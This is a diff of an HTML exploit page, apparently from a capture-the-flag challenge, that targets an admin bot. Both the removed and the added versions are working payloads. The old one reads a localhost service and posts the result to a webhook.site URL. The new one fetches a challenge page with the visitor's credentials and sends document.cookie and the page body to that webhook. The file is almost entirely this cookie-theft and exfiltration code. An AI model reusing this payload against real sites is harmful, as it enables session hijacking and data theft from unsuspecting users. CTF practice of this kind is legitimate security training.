@@ -1,20 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Malicious Page</title>
+    <title>Exploit</title>
     <script>
-        fetch('http://localhost:5000')
-            .then(response => response.text())
-            .then(data => {
-                fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ response: data })
-                });
-            });
+        // Step 1: Fetch the vulnerable URL with query params
+        fetch('http://chal1.lagncra.sh:8426/?lang=en', {
+            credentials: 'include' // Include admin's cookies in the request
+        })
+        .then(response => response.text()) // Read response as text
+        .then(data => {
+            // Step 2: Exfiltrate cookies and response body to your webhook
+            fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e/?cookies=' + document.cookie + '&lang_response=' + encodeURIComponent(data));
+        });
     </script>
 </head>
 <body>
-    <p>Exploiting SSRF...</p>
+    <p>Exploiting admin bot...</p>
 </body>
 </html>
